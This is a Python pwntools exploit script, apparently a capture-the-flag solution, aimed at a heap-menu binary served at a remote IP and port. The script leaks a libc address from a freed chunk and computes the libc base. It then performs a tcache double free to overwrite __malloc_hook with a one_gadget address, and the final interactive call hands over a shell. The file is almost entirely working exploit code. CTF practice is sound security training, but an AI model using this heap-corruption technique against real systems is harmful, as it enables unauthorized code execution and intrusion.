from pwn import *

is_remote = 1
# is_remote = 1

load_loca_so = 0
# load_loca_so = 1

is_debug = 1
# is_debug = 0

arch32 = 0
# arch32 = 1

remote_addr = "34.92.96.238"
remote_port = 10001

binary_path = "./chall"

local_libc32_path = "/lib/i386-linux-gnu/libc.so.6"   # 32 bit
local_libc64_path = "/lib/x86_64-linux-gnu/libc-2.27.so"  # 64 bit
provided_libc_path = "./lib/libc.so.6"


elf = ELF(binary_path)

if is_remote:
	p = remote(remote_addr, remote_port)
	libc = ELF(provided_libc_path)
else:
	if arch32:
		context.arch = "i386"
		libc = ELF(local_libc32_path)
	else:
		context.arch = "amd64"
		libc = ELF(local_libc64_path)
	# load local so
	if load_loca_so:
		p = process(binary_path, env={'LD_PRELOAD':"./lib/libc.so.6"})
	else:
		p = process(binary_path)

if is_debug:
	context.log_level = 'debug'


def log(s,addr):
	print('\033[1;32;40m%20s-->0x%x\033[0m'%(s,addr))

def debug(cmd):
	gdb.attach(p, cmd)
	raw_input("GDb debug......")

# ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

def _add(size, name, call):
	p.sendline(str(1))
	p.sendlineafter("Please input the size of girl's name\n", str(size))
	p.sendafter("please inpute her name:\n", name)
	p.sendafter("please input her call:\n", call)
	p.recvuntil("Input your choice:")

def _show(index):
	p.sendline(str(2))
	p.sendlineafter("Please input the index:", str(index))
	# p.recvuntil("Input your choice:")


def _call(index):
	p.sendline(str(4))
	p.sendlineafter("Please input the index:", str(index))
	p.recvuntil("Input your choice:")



def hack():
	p.recvuntil("Input your choice:")

	for i in range(9):
		_add(0x80, 'a'*0x80, 'b'*0xc)

	for i in range(8):
		_call(i)

	_show(7)
	p.recvuntil("name:\n")
	leak_main_arena = u64(p.recvuntil('\n', drop=True).ljust(8, '\x00')) - (112-0x10)
	libcBase = leak_main_arena - 0x3ebc40

	log('leak_main_arena', leak_main_arena)
	log('libcBase', libcBase)


	# IO_list_all = libcBase + libc.symbols['_IO_list_all']
	malloc_hook = libcBase + libc.symbols['__malloc_hook']
	one_gadget = libcBase + 0x10a38c
	log('malloc_hook', malloc_hook)
	log('one_gadget', one_gadget)

	# debug('')

	_add(0x80, '2'*0x80, '3'*0xc) #9
	_call(5)
	raw_input('double free')

	_add(0x80, p64(malloc_hook)+'2'*0x78, '3'*0xc) # 10
	_add(0x80, 'a'*0x80, 'b'*0xc) # 11
	raw_input('malloc hook')
	_add(0x80, p64(one_gadget), '3'*0xc) # 12


	# _call(7)


if __name__ == '__main__':
	hack()
	p.interactive()